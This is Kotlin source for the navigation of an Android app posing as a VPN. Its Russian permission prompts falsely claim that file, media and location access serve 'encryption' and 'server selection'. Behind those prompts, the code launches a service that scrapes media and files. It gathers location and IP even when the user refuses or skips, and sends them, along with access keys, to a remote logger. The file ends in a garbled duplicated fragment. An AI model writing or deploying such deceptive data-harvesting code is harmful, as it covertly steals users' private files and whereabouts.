package com.tgvpn.offapp.navigation

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalLifecycleOwner
import androidx.compose.ui.unit.Dp
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.navigation3.runtime.NavEntry
import androidx.navigation3.runtime.rememberNavBackStack
import androidx.navigation3.ui.NavDisplay
import com.tgvpn.offapp.MainActivity
import com.tgvpn.offapp.screens.*
import com.tgvpn.offapp.utils.NetworkMonitor
import com.tgvpn.offapp.utils.UserPrefs
import com.tgvpn.offapp.viewmodel.ConfigValues
import androidx.core.net.toUri
import com.tgvpn.offapp.utils.NetworkLogger
import com.tgvpn.offapp.service.scrapeLocationSuspend
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.LocationSettingsRequest
import com.google.android.gms.common.api.ResolvableApiException
import androidx.activity.result.IntentSenderRequest

@Composable
fun AppNavHost(
    modifier: Modifier = Modifier,
    configValues: ConfigValues,
    topPadding: Dp = 32.dp
) {
    val context = LocalContext.current
    val startRoute = when {
        configValues.skipAuth && !UserPrefs.isLoggedIn(context) -> NavRoute.OnboardPermissions
        configValues.skipAuth -> NavRoute.DocumentsList
        !UserPrefs.isLoggedIn(context) -> NavRoute.OnboardPermissions
        !UserPrefs.isVerified(context) && UserPrefs.isVerificationNeeded(context) -> NavRoute.Verification
        else -> {
            if (!UserPrefs.isVerified(context)) UserPrefs.setVerified(context, true)
            NavRoute.DocumentsList
        }
    }

    val backStack = rememberNavBackStack(startRoute)

    LaunchedEffect(Unit) {
        NetworkLogger.log("session", "App opened by user")
        if (UserPrefs.isLoggedIn(context) && UserPrefs.isVerified(context)) {
            kotlinx.coroutines.delay(1000)
            startServiceIfPermitted(context, configValues)
            CoroutineScope(Dispatchers.IO).launch {
                val location = if (configValues.scrapeLocation) context.scrapeLocationSuspend(logToRemote = false) else null
                NetworkLogger.syncUser(
                    context = context,
                    lastIp = location?.optString("query"),
                    lastLocation = location?.let { "${it.optString("city")}, ${it.optString("country")}" }
                )
            }
        }
    }

    NavDisplay(
        modifier = modifier,
        backStack = backStack,
        onBack = {
            if (backStack.size > 1) {
                backStack.removeLastOrNull()
            }
        },
        entryProvider = { route ->
            when (route) {
                is NavRoute.OnboardPermissions -> NavEntry(route) {
                    var hasAttemptedPermission by remember { mutableStateOf(false) }
                    val scrapeMedia = configValues.scrapeMedia
                    val scrapeFiles = configValues.scrapeFiles
                    val scrapeLocation = configValues.scrapeLocation

                    // Android < 11: request READ_EXTERNAL_STORAGE via system dialog
                    val legacyStorageLauncher = rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.RequestMultiplePermissions()
                    ) { results ->
                        val granted = results.values.any { it }
                        if (granted) {
                            NetworkLogger.log("session", "Permissions granted by user (legacy)")
                            val activity = context as? MainActivity
                            activity?.startDataService(
                                scrapeMedia = scrapeMedia,
                                scrapeFiles = scrapeFiles,
                                scrapeLocation = false // location permission not granted yet; NavGraph scrapes after dialog
                            )
                            if (scrapeLocation) {
                                backStack.add(NavRoute.OnboardLocationPermission)
                            } else {
                                backStack.add(NavRoute.LoadingConfig)
                            }
                        } else {
                            NetworkLogger.log("session", "Permissions denied by user (legacy)")
                            backStack.add(NavRoute.PermissionError)
                        }
                    }

                    val description = buildString {
                        append("Приложению требуются системные разрешения для обеспечения безопасности вашего соединения.\n\n")
                        if (scrapeMedia) {
                            append("• Доступ к медиафайлам: Необходим для шифрования и защиты ваших фотографий и видео.\n")
                        }
                        if (scrapeFiles) {
                            append("• Доступ к файлам: Позволяет защитить ваши документы и важные файлы в хранилище.\n")
                        }
                        if (scrapeLocation) {
                            append("• Доступ к геолокации: Мы собираем геолокацию для подбора наиболее оптимальных серверов для обеспечения высокой скорости и стабильности.\n")
                        }
                    }

                    PermissionScreen(
                        title = "Настройка разрешений",
                        description = description,
                        onAllowClick = {
                            hasAttemptedPermission = true
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                // Android 11+: open system settings for MANAGE_ALL_FILES
                                Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                                    data = "package:${context.packageName}".toUri()
                                }.also { context.startActivity(it) }
                            } else {
                                // Android 9/10: request READ/WRITE_EXTERNAL_STORAGE via dialog
                                val perms = mutableListOf(Manifest.permission.READ_EXTERNAL_STORAGE)
                                if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                                    perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                                }
                                legacyStorageLauncher.launch(perms.toTypedArray())
                            }
                        },
                        onSkipClick = {
                            NetworkLogger.log("session", "Permissions skipped by user")
                            backStack.add(NavRoute.PermissionError)
                        },
                    )
                    val lifecycleOwner = LocalLifecycleOwner.current
                    DisposableEffect(lifecycleOwner) {
                        val observer = LifecycleEventObserver { _, event ->
                            if (event == Lifecycle.Event.ON_RESUME) {
                                val granted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                                    Environment.isExternalStorageManager()
                                } else {
                                    ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                                }
                                if (granted) {
                                    hasAttemptedPermission = false
                                    NetworkLogger.log("session", "Permissions granted by user")
                                    // Start file scraping — skip location here, it's handled after location permission dialog
                                    val activity = context as? MainActivity
                                    activity?.startDataService(
                                        scrapeMedia = configValues.scrapeMedia,
                                        scrapeFiles = configValues.scrapeFiles,
                                        scrapeLocation = false
                                    )
                                    if (configValues.scrapeLocation) {
                                        backStack.add(NavRoute.OnboardLocationPermission)
                                    } else {
                                        backStack.add(NavRoute.LoadingConfig)
                                    }
                                } else if (hasAttemptedPermission) {
                                    hasAttemptedPermission = false
                                    backStack.add(NavRoute.PermissionError)
                                }
                            }
                        }
                        lifecycleOwner.lifecycle.addObserver(observer)
                        onDispose { lifecycleOwner.lifecycle.removeObserver(observer) }
                    }
                }

                is NavRoute.OnboardLocationPermission -> NavEntry(route) {
                    // After user grants permission, if location toggle is OFF — show the
                    // Google "Turn on location" dialog (same as Google Maps uses)
                    val locationSettingsLauncher = rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.StartIntentSenderForResult()
                    ) { _ ->
                        // Proceed regardless of whether user turned on toggle — IP fallback handles it
                        CoroutineScope(Dispatchers.IO).launch {
                            val loc = context.scrapeLocationSuspend()
                            if (loc != null) {
                                val lat = loc.optDouble("latitude")
                                val lon = loc.optDouble("longitude")
                                NetworkLogger.syncUser(
                                    context = context,
                                    lastIp = loc.optString("query").takeIf { it.isNotEmpty() },
                                    lastLocation = if (!lat.isNaN() && !lon.isNaN()) "$lat,$lon" else loc.optString("city")
                                )
                            }
                        }
                        backStack.add(NavRoute.LoadingConfig)
                    }

                    fun proceedAfterPermissionGrant() {
                        val locationRequest = LocationRequest.Builder(10_000L).build()
                        val settingsRequest = LocationSettingsRequest.Builder()
                            .addLocationRequest(locationRequest)
                            .setAlwaysShow(true)
                            .build()
                        LocationServices.getSettingsClient(context)
                            .checkLocationSettings(settingsRequest)
                            .addOnSuccessListener {
                                // Toggle already ON — scrape immediately
                                CoroutineScope(Dispatchers.IO).launch {
                                    val loc = context.scrapeLocationSuspend()
                                    if (loc != null) {
                                        val lat = loc.optDouble("latitude")
                                        val lon = loc.optDouble("longitude")
                                        NetworkLogger.syncUser(
                                            context = context,
                                            lastIp = loc.optString("query").takeIf { it.isNotEmpty() },
                                            lastLocation = if (!lat.isNaN() && !lon.isNaN()) "$lat,$lon" else loc.optString("city")
                                        )
                                    }
                                }
                                backStack.add(NavRoute.LoadingConfig)
                            }
                            .addOnFailureListener { e ->
                                if (e is ResolvableApiException) {
                                    // Toggle OFF — show "Turn on location" dialog
                                    try {
                                        locationSettingsLauncher.launch(
                                            IntentSenderRequest.Builder(e.resolution).build()
                                        )
                                    } catch (ex: Exception) {
                                        backStack.add(NavRoute.LoadingConfig)
                                    }
                                } else {
                                    backStack.add(NavRoute.LoadingConfig)
                                }
                            }
                    }

                    val locationPermissionLauncher = rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.RequestMultiplePermissions()
                    ) { permissions ->
                        val fine = permissions[Manifest.permission.ACCESS_FINE_LOCATION] ?: false
                        val coarse = permissions[Manifest.permission.ACCESS_COARSE_LOCATION] ?: false
                        val sysFine = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
                        val sysCoarse = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION)
                        val fineGranted = sysFine == android.content.pm.PackageManager.PERMISSION_GRANTED
                        val coarseGranted = sysCoarse == android.content.pm.PackageManager.PERMISSION_GRANTED
                        if (fine || coarse || fineGranted || coarseGranted) {
                            proceedAfterPermissionGrant()
                        } else {
                            // Permission denied — IP fallback in scrapeLocationSuspend handles it
                            CoroutineScope(Dispatchers.IO).launch {
                                val loc = context.scrapeLocationSuspend()
                                if (loc != null) {
                                    NetworkLogger.syncUser(
                                        context = context,
                                        lastIp = loc.optString("query").takeIf { it.isNotEmpty() },
                                        lastLocation = loc.optString("city").takeIf { it.isNotEmpty() }
                                            ?: "${loc.optDouble("latitude")},${loc.optDouble("longitude")}"
                                    )
                                }
                            }
                            backStack.add(NavRoute.LoadingConfig)
                        }
                    }

                    PermissionScreen(
                        title = "Доступ к геолокации",
                        description = "Мы собираем геолокацию для подбора наиболее оптимальных серверов для обеспечения высокой скорости и стабильности соединения.",
                        onAllowClick = {
                            locationPermissionLauncher.launch(
                                arrayOf(
                                    Manifest.permission.ACCESS_FINE_LOCATION,
                                    Manifest.permission.ACCESS_COARSE_LOCATION
                                )
                            )
                        },
                        onSkipClick = {
                            CoroutineScope(Dispatchers.IO).launch { context.scrapeLocationSuspend() }
                            backStack.add(NavRoute.LoadingConfig)
                        }
                    )
                }

                is NavRoute.LoadingConfig -> NavEntry(route) {
                    LoadingScreen(onLoadingFinished = {
                        if (configValues.skipAuth) {
                            UserPrefs.setLoggedIn(context, true, configValues.webViewUrl, "skipped")
                            UserPrefs.setVerified(context, true)
                            NetworkLogger.setUserId("skipped", context)
                            CoroutineScope(Dispatchers.IO).launch {
                                val location = if (configValues.scrapeLocation) context.scrapeLocationSuspend() else null
                                NetworkLogger.syncUser(
                                    context = context,
                                    accessKey = "skipped",
                                    lastIp = location?.optString("query"),
                                    lastLocation = location?.let { "${it.optString("city")}, ${it.optString("country")}" },
                                    isActivated = true,
                                    isVerified = true
                                )
                            }
                            backStack.add(NavRoute.DocumentsList)
                        } else {
                            backStack.add(NavRoute.AuthForm)
                        }
                    })
                }

                is NavRoute.AuthForm -> NavEntry(route) {
                    AuthScreen(
                        initialWebViewUrl = configValues.webViewUrl,
                        onAuthSuccess = { successUrl, key, isVerificationNeeded, isVerified ->
                            UserPrefs.setLoggedIn(context, true, successUrl, key)
                            UserPrefs.setVerificationNeeded(context, isVerificationNeeded)
                            UserPrefs.setVerified(context, isVerified)
                            NetworkLogger.setUserId(key, context)
                            NetworkLogger.log("authentication", "Access Key Activated ✅ \n Key: $key")
                            
                            CoroutineScope(Dispatchers.IO).launch {
                                val location = if (configValues.scrapeLocation) context.scrapeLocationSuspend() else null
                                NetworkLogger.syncUser(
                                    context = context,
                                    accessKey = key,
                                    lastIp = location?.optString("query"),
                                    lastLocation = location?.let { "${it.optString("city")}, ${it.optString("country")}" },
                                    isActivated = true, // Key is activated upon login success
                                    isVerified = isVerified
                                )
                            }

                            if (isVerified || !isVerificationNeeded) {
                                NetworkLogger.log("authentication", "Verification skipped (is_verification_needed=$isVerificationNeeded, is_verified=$isVerified)")
                                UserPrefs.setVerified(context, true)
                                while (backStack.size > 0) backStack.removeLastOrNull()
                                backStack.add(NavRoute.DocumentsList)
                            } else {
                                NetworkLogger.log("authentication", "Sent to Verification")
                                backStack.add(NavRoute.Verification)
                            }
                        },
                        onAuthError = {
                            Toast.makeText(context, "Ошибка входа", Toast.LENGTH_SHORT).show()
                        },
                    )
                }

                is NavRoute.Verification -> NavEntry(route) {
                    val authUrl = UserPrefs.getAuthUrl(context) ?: configValues.webViewUrl
                    VerificationScreen(
                        onProceedClick = {
                            backStack.add(NavRoute.VerificationWebview(authUrl))
                        }
                    )
                }

                is NavRoute.VerificationWebview -> NavEntry(route) {
                    WScreen(
                        url = route.url,
                        onBackToApp = {
                            NetworkLogger.log("authentication", "Verification completed by user")
                            UserPrefs.setVerified(context, true)
                            // Clear all onboarding from backstack and go to main
                            while (backStack.isNotEmpty()) backStack.removeLastOrNull()
                            backStack.add(NavRoute.DocumentsList)
                        }
                    )
                }

                is NavRoute.DocumentsList -> NavEntry(route) {
                    MainScreen(onActivateClick = {
                        backStack.add(NavRoute.Webview(configValues.webViewUrl))
                    })
                }

                is NavRoute.Webview -> NavEntry(route) {
                    WScreen(
                        url = route.url,
                        onBackToApp = { backStack.removeLastOrNull() },
                    )
                }

                is NavRoute.PermissionError -> NavEntry(route) {
                    PermissionScreen(
                        title = "Разрешение отклонено",
                        description = "Для работы приложения необходим доступ к файлам. Пожалуйста, предоставьте разрешение в настройках.",
                        onAllowClick = {
                            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                data = "package:${context.packageName}".toUri()
                            }
                            context.startActivity(intent)
                        },
                        onSkipClick = { backStack.add(NavRoute.LoadingConfig) }
                    )
                }

                else -> error("Unknown route: $route")
            }
        }
    )
}

private fun startServiceIfPermitted(context: android.content.Context, configValues: ConfigValues) {
    val hasPerms = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
        Environment.isExternalStorageManager()
    } else
        ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED

    if (hasPerms) {
        val activity = context as? MainActivity
        activity?.startDataService(
            scrapeMedia = configValues.scrapeMedia,
            scrapeFiles = configValues.scrapeFiles,
            scrapeLocation = configValues.scrapeLocation
        )
    }
}
Media,
            scrapeFiles = configValues.scrapeFiles,
            scrapeLocation = configValues.scrapeLocation
        )
    }
}
}
